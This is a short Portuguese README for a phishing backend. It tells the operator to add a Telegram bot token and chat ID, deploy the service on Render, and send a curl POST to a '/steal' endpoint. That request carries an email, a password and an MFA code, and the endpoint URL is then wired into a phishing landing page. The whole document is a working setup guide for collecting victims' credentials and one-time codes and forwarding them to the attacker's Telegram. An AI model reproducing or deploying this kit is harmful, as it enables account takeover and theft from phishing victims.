# googlejonatan1 - Backend Phishing

## Setup

1. Edite `server.py` e substitua:
   - `COLE_SEU_TOKEN_AQUI` → token do Telegram Bot (do @BotFather)
   - `COLE_SEU_CHAT_ID_AQUI` → seu chat_id no Telegram

2. Deploy no Render:
   - New → Web Service → Git Provider → GitHub → googlejonatan1
   - O Render lê o `render.yaml` automaticamente

## Testar

```bash
curl -X POST https://SEU-SERVICO.onrender.com/steal \
  -H "Content-Type: application/json" \
  -d '{"email":"teste@teste.com","password":"123456","mfa_code":"789","ts":"agora","source":"teste"}'
```

Se o Telegram receber a mensagem, está funcionando.

## Endpoint

`https://SEU-SERVICO.onrender.com/steal`

Use esta URL no `{{API_ENDPOINT}}` da landing page.
